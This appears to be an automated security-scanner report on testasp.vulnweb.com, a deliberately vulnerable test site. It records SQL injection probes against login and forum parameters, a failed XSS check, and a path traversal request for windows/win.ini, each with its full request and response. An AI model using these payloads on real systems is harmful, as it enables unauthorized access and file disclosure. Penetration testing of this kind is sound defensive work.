# L3 Proven Real Impact — http://testasp.vulnweb.com
run `run-e2a9fe4450` — layer sentinel-impact/4.4.0

- impacts: 6 total / **5 VERIFIED** / 0 INFERRED / 1 PROBE_FAILED / 0 NOT_SAFE_TO_PROVE / 0 REFUSED
- safety ceiling: capability proven, not exploited — أُثبتت القدرة، لم تُستغَل

## sql_version_oracle — VERIFIED
- path `L3P-f398e21dd6` findings ['F-1b63b983d5'] — sql_version_oracle at /Login.asp (param tfUPass) — minimal benign proof
- detail: `{"control_true_size": 5931, "control_false_size": 3235, "version_true_size": 5931, "version_false_size": 3235, "version_char": null, "digit_probes": {"version_digit_5": 3235, "version_digit_8": 3235}}`
- evidence [probe] pr-0001: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=sentinel&tfUPass=1%27+OR+%271%27%3D%271%27+--'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0002: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=sentinel&tfUPass=1%27+OR+%271%27%3D%272%27+--'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0003: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=sentinel&tfUPass=1%27+OR+%40%40version+LIKE+%27%25%27+--'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0004: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=sentinel&tfUPass=1%27+OR+%40%40version+LIKE+%27zzz-sentinel-nope%25%27+--'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'

## sql_version_oracle — VERIFIED
- path `L3P-35d00e26d3` findings ['F-392b76b39c'] — sql_version_oracle at /showforum.asp (param id) — minimal benign proof
- detail: `{"control_true_size": 2965, "control_false_size": 1208, "version_true_size": 3035, "version_false_size": 1208, "version_char": null, "digit_probes": {"version_digit_5": 1208, "version_digit_8": 1208}}`
- evidence [probe] pr-0007: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D1 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0008: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht'
  - probe: GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2 body=''
  - response: status 500 body='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/'
- evidence [probe] pr-0009: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+%40%40version+LIKE+%27%25%27 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0010: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht'
  - probe: GET http://testasp.vulnweb.com/showforum.asp?id=2+AND+%40%40version+LIKE+%27zzz-sentinel-nope%25%27 body=''
  - response: status 500 body='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/'

## sql_version_oracle — VERIFIED
- path `L3P-3b04c26017` findings ['F-513d590d27'] — sql_version_oracle at /Login.asp (param tfUName) — minimal benign proof
- detail: `{"control_true_size": 5939, "control_false_size": 3235, "version_true_size": 5950, "version_false_size": 3235, "version_char": null, "digit_probes": {"version_digit_5": 3235, "version_digit_8": 3235}}`
- evidence [probe] pr-0013: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=1%27+OR+%271%27%3D%271%27+--&tfUPass=sentinel'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0014: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=1%27+OR+%271%27%3D%272%27+--&tfUPass=sentinel'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0015: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=1%27+OR+%40%40version+LIKE+%27%25%27+--&tfUPass=sentinel'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0016: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: POST http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0 body='tfUName=1%27+OR+%40%40version+LIKE+%27zzz-sentinel-nope%25%27+--&tfUPass=sentinel'
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'

## sql_version_oracle — VERIFIED
- path `L3P-253df22e59` findings ['F-5257ed42db'] — sql_version_oracle at /showthread.asp (param id) — minimal benign proof
- detail: `{"control_true_size": 3142, "control_false_size": 1208, "version_true_size": 3212, "version_false_size": 1208, "version_char": null, "digit_probes": {"version_digit_5": 1208, "version_digit_8": 1208}}`
- evidence [probe] pr-0019: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D1 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0020: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht'
  - probe: GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+1%3D2 body=''
  - response: status 500 body='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/'
- evidence [probe] pr-0021: '\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional/'
  - probe: GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+%40%40version+LIKE+%27%25%27 body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'
- evidence [probe] pr-0022: '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht'
  - probe: GET http://testasp.vulnweb.com/showthread.asp?id=3+AND+%40%40version+LIKE+%27zzz-sentinel-nope%25%27 body=''
  - response: status 500 body='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/'

## xss_browser_execution — PROBE_FAILED
- path `L3P-16d0d4e8cc` findings ['F-9e99b000d0'] — xss_browser_execution at /Search.asp (param tfSearch) — minimal benign proof
- reason: the browser did not execute the planned canary (measured below) — honest failure, never a fake proof
- detail: `{"fired": false, "observed_flag": "", "expected_flag": "l3canary"}`

## traversal_file_read — VERIFIED
- path `L3P-2320951de8` findings ['F-acb5de3e87'] — traversal_file_read at /Templatize.asp (param item) — minimal benign proof
- detail: `{"file": "om/Templatize.asp?item=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini", "shared_markers": ["<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">", "<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->", "<!-- InstanceBeginEditable name=\"doctitle\" -->", "<title>Untitled Document</title>"]`
- evidence [probe] pr-0026: '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.or'
  - probe: GET http://testasp.vulnweb.com/Templatize.asp?item=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini body=''
  - response: status 200 body='\r\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/htm'

